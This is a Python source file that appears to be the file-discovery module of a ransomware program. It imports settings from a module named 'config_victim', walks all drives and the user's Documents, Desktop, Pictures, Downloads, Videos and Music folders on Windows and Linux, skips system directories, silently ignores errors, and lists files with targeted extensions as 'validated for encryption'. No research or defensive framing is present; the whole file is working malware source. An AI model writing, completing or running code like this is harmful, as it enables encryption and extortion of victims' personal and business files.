import os
import platform
from config_victim import (
    TARGET_EXTENSIONS,
    get_drives_to_scan,
    get_excluded_dirs,
    validate_file_for_encryption,
    WINDOWS_EXCLUDED_DIRS,
    LINUX_EXCLUDED_DIRS
)

def scan_for_target_files():
   
    drives = get_drives_to_scan()
    target_files = []
    
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive):
                
                current_excluded_dirs = get_excluded_dirs()
                if any(excluded_dir in root.lower() for excluded_dir in current_excluded_dirs):
                    continue
                
                for file in files:
                    file_path = os.path.join(root, file)
                    if validate_file_for_encryption(file_path):
                        target_files.append(file_path)
                        
        except Exception:
            continue
    
    return target_files

def target_extension(directory):
   
    target_files = []
    
    try:
        for root, folders, files in os.walk(directory):
          
            if any(excluded_dir in root.lower() for excluded_dir in get_excluded_dirs()):
                continue
                
            for file in files:
                if '.' in file:
                    extension = "." + file.split(".")[-1].lower()
                    if extension in TARGET_EXTENSIONS:
                        full_path = os.path.join(root, file)
                        if validate_file_for_encryption(full_path):
                            target_files.append(full_path)
    except PermissionError:
        pass
    except Exception:
        pass
    
    return target_files

def quick_scan_user_directories():
   
    user_dirs = []
    system = platform.system().lower()
    
    if system == "windows":
        user_dirs = [
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Desktop"), 
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music")
        ]
    else:
        user_dirs = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Videos"),
            os.path.expanduser("~/Music")
        ]
    
  
    user_dirs = [d for d in user_dirs if os.path.exists(d)]
    
    target_files = []
    for directory in user_dirs:
        target_files.extend(target_extension(directory))
    
    return target_files

def get_scan_stats():
    
    drives = get_drives_to_scan()
    return {
        'available_drives': drives,
        'target_extensions_count': len(TARGET_EXTENSIONS),
        'excluded_dirs_count': len(get_excluded_dirs())
    }